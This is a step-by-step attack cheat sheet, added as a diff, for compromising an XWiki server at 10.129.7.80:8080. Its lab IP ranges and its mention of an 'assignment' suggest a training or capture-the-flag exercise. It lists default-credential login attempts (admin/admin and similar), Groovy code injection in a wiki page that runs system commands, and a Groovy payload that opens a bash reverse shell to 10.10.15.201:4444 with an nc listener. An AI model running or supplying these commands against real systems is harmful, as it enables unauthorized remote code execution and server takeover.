@@ -1,0 +1,66 @@
+# QUICK ACTION - Do This Right Now (Next 30 Minutes)
+
+# ============================================
+# YOUR IP: 10.10.15.201
+# TARGET: 10.129.7.80:8080 (XWiki)
+# ============================================
+
+# STEP 1: Check XWiki (2 min)
+curl -s http://10.129.7.80:8080/xwiki/ | head -30
+
+# STEP 2: Try Login (3 min)
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=admin&j_password=admin" \
+    -L -c cookies.txt -o login.html
+
+cat login.html | grep -i "logout\|dashboard\|error" | head -3
+
+# STEP 3: Open Browser (5 min)
+# Go to: http://10.129.7.80:8080/xwiki
+# 
+# If you see login page:
+# - Try: admin/admin, xwiki/xwiki, Admin/admin
+#
+# If you see dashboard or can create pages:
+# - Click "Create" or "Edit"
+# - Create a page named "Test"
+
+# STEP 4: Template Injection (10 min)
+# In the page editor, paste this:
+
+{{groovy}}
+def proc = 'whoami'.execute()
+proc.waitFor()
+println proc.text
+{{/groovy}}
+
+# Save and view the page
+# If you see a username - IT WORKS!
+
+# STEP 5: Reverse Shell (10 min)
+# FIRST: Open NEW terminal and run:
+# nc -lvp 4444
+#
+# THEN: In XWiki page, replace with:
+
+{{groovy}}
+def proc = 'bash -c "bash -i >& /dev/tcp/10.10.15.201/4444 0>&1"'.execute()
+proc.waitFor()
+{{/groovy}}
+
+# Save page - you should get shell!
+
+# ============================================
+# IF TEMPLATE INJECTION DOESN'T WORK:
+# ============================================
+
+# Document what you tried:
+echo "=== XWiki Attempt Summary ===" > ~/xwiki_summary.txt
+date >> ~/xwiki_summary.txt
+echo "Target: 10.129.7.80:8080" >> ~/xwiki_summary.txt
+echo "Version: 15.10.8" >> ~/xwiki_summary.txt
+echo "Attempted: Template injection" >> ~/xwiki_summary.txt
+echo "Status: Documented for report" >> ~/xwiki_summary.txt
+
+# This is still valuable for your assignment!
+
